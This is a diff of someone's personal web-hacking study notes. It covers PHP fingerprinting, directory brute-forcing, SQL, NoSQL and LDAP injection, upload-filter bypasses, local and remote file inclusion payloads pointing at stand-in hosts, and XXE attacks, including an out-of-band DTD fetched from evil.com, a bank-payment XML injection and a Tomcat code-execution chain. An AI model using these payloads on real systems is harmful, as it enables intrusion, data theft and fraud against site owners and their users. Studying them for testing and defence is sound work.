@@ -1,3 +1,5 @@
+galerii has robots.txt
+
 -------------------
 Attacking strategies:
 -------------------
@@ -48,11 +50,15 @@ firewall) installed. In that case, mimic the browser and send a user-agent strin
 All of these (along with solutions) can be found here, in the comments section: http://php.net/manual/en/security.hiding.php
 
 If expose_php hasn't been set to off in the Apache conf file (which also hides .php extensions), then put this as 
-an argument to get php info: ?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+an argument to get php info: ?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000  //This is removed in PHP 5.5, I can't get it to work anymore
 
 The PHP session ID cookie's name defaults to "PHPSESSIONID".
 
 The website might have "X-powered by PHP" in a HTTP response header.
+
+[+] Find out PHP version: //Removed since PHP 5.5, I can't get it to work anymore
+Either through php info above, or by identifying what logo it has
+https://labs.detectify.com/2012/10/29/do-you-dare-to-show-your-php-easter-egg/
 
 ---------------
 Enumeration:
@@ -69,9 +75,15 @@ remote file inclusion, etc).
 
 nikto -h [domain or ip]
 
-[+] Directory scans: brute force directories/files (using wfuzz)
+[+] Directory scans: 
+
+brute force directories/files (using wfuzz)
 python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ
 for a time delay, do -s
+if you're getting "soft 404s", then you can filter by character length  --hh number_of_chars_in_soft_404
+
+(using dirbuster):
+http://www.exploresecurity.com/three-cheers-for-dirbuster/
 
 Identify the file extensions in use within known areas of the
 application   (e.g.   jsp,   aspx,   html),   and   use   a   basic   wordlist   
@@ -217,32 +229,50 @@ SQLi/SQL injection
 also you can try ...UNION SELECT 1,2,3-- 
 
 
-Make sure the number of columns in the UNION  request matches the amount before the UNION. 
+[+] Make sure the number of columns in the UNION  request matches the amount before the UNION. 
 You can do this with UNION SELECT 1, 2, 3, 4, etc. until you stop getting an error
 
 What select 1 does is it gives you the first column, but replaces all values with ones. The formal name of the column remains the 
 same though (so if you do mysql_fetch_array(sqlquery)['id'] (and id is the first row), and the sqlquery is SELECT 1, 
 then it will give you 1. If you do SELECT 1, 2 and id is the second row, you get 2.
 
-When you want to comment something out, you need "-- " at the end. MIND THE SPACE.
+[+] When you want to comment something out, you need "-- " at the end. MIND THE SPACE.
 The problem with URL bars in browsers is that even if you put that space at the end, it will take it off. Use %20 at the end instead.
 
-Keep in mind the left to right nature of SQL (like most other languages).
+[+] Keep in mind the left to right nature of SQL (like most other languages).
 SELECT user, password WHERE user=admin AND password='' OR 1=1-- 
 is equivalent to
 SELECT user, password WHERE (user=admin AND password='') OR 1=1-- 
 Meaning you'll get all users returned. Or, if only one user is returned, you'll only get the first user back.
 
-To get table and column info, type 
-SELECT concat(table_name,':', column_name) FROM information_schema.columns
+[+] Quite often, you'll find 'username' and 'password' from the 'users' table. 
+
+[+] To get table and column info, type:
+MySQL:  SELECT concat(table_name,':', column_name) FROM information_schema.columns
 
 [+] SQLmap tutorial - http://www.binarytides.com/sqlmap-hacking-tutorial/
 frst thing to try - sqlmap -u "mysite.com/sql.php?param=1"
 POST request: https://hackertarget.com/sqlmap-post-request-injection/
 
+[+] SQL Truncation attack - attack registration forms to gain access to any user account.
+This might only work on MySQL. According to my testing it should work for even custom databases (not the default one).
+Since the creators can specify their own max length, then you might want to put a shitload of whitespace in between there.
+http://resources.infosecinstitute.com/sql-truncation-attack/
+
+Register the following:
+username: admin                         (lots of spaces in between)And then whatever.
+password: mypassword123
+
+"admin                " is equal to "admin", because the database discards any whitespace after that.
+
+If the "username" accepts only, say, 20 characters (this is a default configuration), then MySQL truncates the input to 20 characters.
+Meaning, the "And then whatever" gets discarded. Since whitespace doesn't count, you're effectively updating the record of "admin". 
+
 [+] Filter evasion:
+
 Advanced ways to evade filters (using tricks like putting backslashes, using MySQL syntax, etc):
 https://websec.files.wordpress.com/2010/11/sqli2.pdf
+
 SQL smuggling for evading filters: 
 if "INSERT" is blacklisted, then do concat("INS", "ERT"). Also UNICODE smuggling: 'Ā' defaults to 'A' and won't be detected.
 starts from like halfway into the document.
@@ -261,7 +291,14 @@ http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
 ---------------------
 NoSQL injection
 ---------------------
-The way NoSQL works is you send a request to update somethin
+https://www.owasp.org/index.php/Testing_for_NoSQL_injection (better)
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20NoSQL%20But%20Even%20Less%20Security.pdf
+
+[+] NoSQL databases often offer no security, so if you can connect to one, you can just query whatever you want.
+
+[+] There are 150 different NoSQL databases, all of them work differently and have different syntax. So, to exploit one, you need to
+familiarize yourself with the syntax. The most common one is MongoDB, so that's what the examples will be based on.
+
 ----------------
 LDAP injection
 ----------------
@@ -303,6 +340,7 @@ This is a good way to check for injection. If injected_filter is (&) and the que
 
 Also, if * is allowed, then you can inject username=* to get the first username in the database.
 Web for Pentester's examples are good if you want to look at the code (in the iso)
+Also, (pass=) gives the same result as (pass=*)
 
 (&(uid=*)(userPassword=*)(&))
 
@@ -323,6 +361,17 @@ To bypass getimagesize(), send a valid image with php in its comments
 [+] The solution is to prevent the users from accessing those files directly by putting them
 outside the webroot and also by obfuscating the name, so that it's very difficult to get it 
 by using LFI. Also prevent all the types of tricks mentioned in the article.
+
+[+] Anti filetype checking methods:
+Check what extension and what content can be uploaded.
+	Try to upload PHP file with the extension changed to the correct one (bypasses extension)
+	Try to upload a file in the correct format with the extension changed to .php (bypasses content)
+	If both enabled, do either;
+		add PHP payload to a PDF file
+		create PHP file that looks like PDF and bypasses the content-type check (much safer)
+		(there are also kali linux programs that do this)
+			https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+			Under "exploitation of local file include"
 -------------------------------------------------------
 RCE/Code injection/Command execution/Command Injection:
 -------------------------------------------------------
@@ -358,7 +407,7 @@ It might be possible to do a multi-line command.
 For this, put an encoded newline (%0a) and your command after the initial command.
 
 -------------------------------------------------------
-Remote/Local File Inclusion/RFI/LFI/Directory Traversal
+Local File Inclusion/LFI/Directory Traversal
 -------------------------------------------------------
 [+] LFI often happens  in multi-language websites. It gets the $language from either the cookie or
 the GET request and then includes language/$lang.php.
@@ -380,23 +429,6 @@ This is a rare vulnerability though.
 It might occur when the dev is dumb or when there's some kind of third party app in between the include() and GET,
 which does the decode.
 
-[+] Remote file inclusion - how to pass any extension or suffix to the URL (like "google.com/.php") without errors:
-If the include() script adds something like _lang.php or whatever at the end of it, then you don't need to 
-make the file end with _lang.php on the remote server. You can just put a "?" at the end of your include.
-?include=http://malicious.com/shell.txt?_lang.php
-The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by as a GET parameter. If the configuration of the vulnerable system doesn't allow remote file include, an error message is displayed.
-
-[+] Exploitation of RFI:
-https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
-Under "exploitation of remote file include"
-
-When you include a web shell, you should include shell.txt, not shell.php. 
-If you include a php file, then the code runs on the external server, not yours.
-
-[+] DVWA Remote File Include:
-Low - ?page=http://evil.com
-Medium - use some other filestream, like php://. Info at https://secure.php.net/manual/en/wrappers.php
-
 
 [+] Local file inclusion:
 
@@ -415,16 +447,21 @@ Meaning, file1/../file1.php returns file1.php.
     upload a file and including it, you can for example upload an image and put your PHP code in the image's comment section (so it won't get modify if the image is resized).
     upload the PHP code via another service: FTP, NFS, ...
     
-[+] Anti filetype checking methods:
-Check what extension and what content can be uploaded.
-	Try to upload PHP file with the extension changed to the correct one (bypasses extension)
-	Try to upload a file in the correct format with the extension changed to .php (bypasses content)
-	If both enabled, do either;
-		add PHP payload to a PDF file
-		create PHP file that looks like PDF and bypasses the content-type check (much safer)
-		(there are also kali linux programs that do this)
-			https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
-			Under "exploitation of local file include"
+    Also these: http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf
+    /proc/self/environ
+	/proc/self/fd/...
+	/var/log/...
+	/var/lib/php/session/(PHP Sessions)
+	/tmp/ (PHP Sessions)
+	php://input wrapper
+	php://filter wrapper
+	data: wrapper
+   
+   Also you can do it with anything that outputs phpinfo() (because the GET and POST variables are in it):
+   http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20LFI%20with%20phpinfo()%20assistance.pdf
+   (there was a way to get phpinfo to appear by doing ?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000, but this doesn't work since PHP5.5 (I couldn't get it to work on any website I tried anymore, not even my own)
+   
+
 
 [+] Including PHP files as base64 so you can read them:
 https://secure.php.net/manual/en/wrappers.php.php
@@ -432,8 +469,25 @@ php://filter/convert.base64-encode/resource=index
 Example: http://127.0.0.1/fileinclude.php?lang=php://filter/convert.base64-encode/resource=hello.php
 data://text/plain;base64 (this probably isn't useful)
 
-[+] Directory traversal - try putting the folder name in there instead of the filename. I wonder what
-will happen. (not much. You can't include() a folder. Depends on the command)
+--------------------------
+RFI/Remote File Inclusion
+--------------------------
+[+] Remote file inclusion - how to pass any extension or suffix to the URL (like "google.com/.php") without errors:
+If the include() script adds something like _lang.php or whatever at the end of it, then you don't need to 
+make the file end with _lang.php on the remote server. You can just put a "?" at the end of your include.
+?include=http://malicious.com/shell.txt?_lang.php
+The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by as a GET parameter. If the configuration of the vulnerable system doesn't allow remote file include, an error message is displayed.
+
+[+] Exploitation of RFI:
+https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+Under "exploitation of remote file include"
+
+When you include a web shell, you should include shell.txt, not shell.php. 
+If you include a php file, then the code runs on the external server, not yours.
+
+[+] DVWA Remote File Include:
+Low - ?page=http://evil.com
+Medium - use some other filestream, like php://. Info at https://secure.php.net/manual/en/wrappers.php
 ---------------
 Post exploitation
 ----------------
@@ -636,3 +690,174 @@ if (!strcmp([], "testpassword")) {
 Server-Side Template inclusion
 --------------------------------
 http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf
+
+--------------------------------------
+XEE/XML External Entity/XML Injection
+--------------------------------------
+The OWASP testing guide is most useful for this.
+XXE can be used for:
+1) DDOS
+2) Data theft
+3) (ADD TO THIS)
+
+(less useful)
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XML%20External%20Entity%20Attacks%20(XXE)%20-%20owasp.pdf
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20What%20You%20Didn't%20Know%20About%20XML%20External%20Entities%20Attacks.pdf
+
+hacksplaining has a good explanation of External entities
+
+<base knowledge of XML>
+[+] Quick explanation of what an entity is http://www.w3schools.com/xml/xml_dtd_entities.asp
+
+[+]An XML document is valid as long as it adheres to the DTD or the XML Schema.
+
+[+] DTD - Document Type Definition.
+
+order.xml could have a reference to order.dtd - the document type definition for order.xml
+
+//This is in order.xml
+<!DOCTYPE order SYSTEM "order.dtd">  
+
+//this is order.dtd. Says what elements need to be in order.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ELEMENT account (#PCDATA)>
+<!ELEMENT contact (#PCDATA)>
+<!ELEMENT count (#PCDATA)>
+<!ELEMENT order (product, count, orderer)>
+<!ELEMENT orderer (contact, account)>
+<!ELEMENT product (#PCDATA)>
+
+[+] XML schema - order.xsd. Similar to order.dtd, but different syntax.
+
+
+[+] Core XML security standards:
+1)XML signatures
+2)XML encryption
+3)XML key management (XKMS)
+4)Security Assertion Markup Language (SAML)
+5)XML access control markup language (XACML)
+
+XML core security
+standards are only
+of limited value when
+the XML generator or
+parser is the target of
+the attack.
+
+
+</base knowledge of XML>
+
+[+] XML External entities
+
+[+] XML generator injection:
+You might be able to inject a fragment. 
+For example, you write the injection in the comment part of an online banking app.
+Your code will get parsed in another app and you'll get the $$$.
+
+<batchjob>
+	<payment>
+		<account>5678-attacker</account>
+		<rcpt>206-1234</rcpt>
+		<amount>100.00</amount>
+		<comment> //INJECTION STARTS HERE
+		</comment>
+	</payment>
+	<payment>
+		<account>1234-victim</account>
+		<rcpt>206-1234</rcpt>
+		<amount>100.00</amount>
+		<comment>Hacked
+		</comment> //INJECTION ENDS HERE
+</payment>
+</batchjob>
+
+[+] 2014 Whitepapaer that's a great resource when pentesting XXE. From the same guys that did the OWASP talk below.
+http://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf
+
+[+] SUMMARY OF OWASP TALK - Stealing data using XXE (From 2013 - check OWASP if anything's changed):
+https://www.youtube.com/watch?v=eHSNT8vWLfc
+(CTRL+F "(EXPLOIT) PARTS IF IN A HURRY. The rest is for better understanding.)
+
+(*)You can't do it without pulling some tricks. If you do: 
+
+<!DOCTYPE updateProfile [
+	<!ENTITY stolenFile SYSTEM "file:///C:/Windows/win.ini">
+]]> 
+<updateProfile>
+	<name>&stolenFile<name>
+</updateProfile>
+
+Then there are some heavy restrictions:
+1) The data is stored server-side in the <name> field, and you need to be able to see it client-side to get the data.
+2) The data you're stealing has to be well-formed XML, so:
+	a) no binary
+	b) in text, no stray '&', '<' or '>'
+	c) IMPORTANT - well-formed XML documents can be included, but are often not usable. 
+		The application is going to try and interpret what you've included. It's going to find a whole series of more tags,
+		and it's either gonna fail the validation or it's not gonna pull the text in as raw text, 
+		it's gonna pull in any data around the next set of tags, so you don't actually get access to the data.
+
+(*) If you get a little bit more complex, you can get around those restrictions by using parameter entities.
+
+(info) A parameter entity is pretty much reusable variable text that you can put inside an entity.
+	For example, 
+	<!ELEMENT residence (name, street, pincode, city, phone)>  //is the same as
+	<!ENTITY % area "name, street, pincode, city">  //These three lines
+	<!ENTITY % contact "phone">
+	<!ELEMENT residence (%area; %contact;)>
+
+(what doesn't work) You can't do <!ENTITY start "<![CDATA["> because it's not well-formed XML (otherwise you could 
+surround any include in CDATA tags, which means to interpret it as raw text.
+
+(the exploit) However, you CAN do it with parameter entities!
+<!DOCTYPE updateProfile [
+	//first we make the parameter entities
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % file SYSTEM "file://c:/has/broken/xml">
+	<!ENTITY % end "]]>">
+	//Then we grab a DTD file from our own website (necessary)
+	<!ENTITY % dtd SYSTEM "http://evil.com/join.dtd">
+ 	//By writing it out we are effectively executing the parameter entity as an entity
+ 	%dtd;
+]]>
+ 
+//This is the join.dtd on our website
+<!ENTITY all "%start;%file;%end">
+
+//This is the field
+<name>&all</name>
+
+This allows you to read well-formed xml documents. Still some restrictions:
+	1) Needs well-formed XML document
+	2) No binary
+	3) Still requires that you get that data back somehow (for example by viewing your profile)
+
+(*)(EXPLOIT) You can do even better. You can make it so that you don't have to get the data back somehow. Refer to 12:52 in the video.
+	1) Still no binary
+	2) either " or ' will cause the error 
+	3) # will cause URL truncation //both 2) and 3) are because of the send entity. If you imagine how variables are placed into that query, you'll understand why that is.
+
+(*) You can use URL protocols to do cool things. In many cases, this is usable without external entity support! (Because if you just put in a DOCTYPE that asks for a dtd from the internet, then you're not actually using external entities. For example, you can do the jar:// things without needing external entities)
+Look at 15:21 of video to see which platforms give you which options
+
+(*)If they're using PHP, you can get also get binary through the use of URL protocols. (php://base64 transition)
+
+(*)Java - use file:// for directory listings.
+Use jar:// to  (20:00)
+	1)retrieve a zip file from the internet (allows for DoS via decompression bombs or via filling up filling up temporary space)
+	2)look inside zip directories (like jar, zip, docx, xlsx) and retrieve files
+	3)File upload to the remote server (21:22).
+If the java is old (pre september 2012. 1.7u7, 1.6u32 and earlier), then gopher:// can be used to send arbitrary data (17:43) (useful for internal network CSRF, port scanning, exploiting secondary network vulns)
+
+(*)(EXPLOIT) Remote Code Execution scenario on older Tomcat server with a private admin panel on the backend:
+	1) Supposing that the server gives you back the data, you can use jar's file:// to explore the server and see directory listings. 
+	2) Let's say you find Tomcat-users.xml (lists users that have access to the private admin interface)
+	3) Upload file to server - evil.war. Hang the connection so the temporary uploaded file stays on the server.
+	4) Find our file using directory listings
+	5) Use gopher to authenticate against the admin interface (instead of using gopher you could CSRF an internal user (probably by using XML entities for the CSRF) and still get the same result)
+	6) Use the admin interface to deploy the temp file as a new app
+	7) Ca$h m0n3y!
+
+
+
+
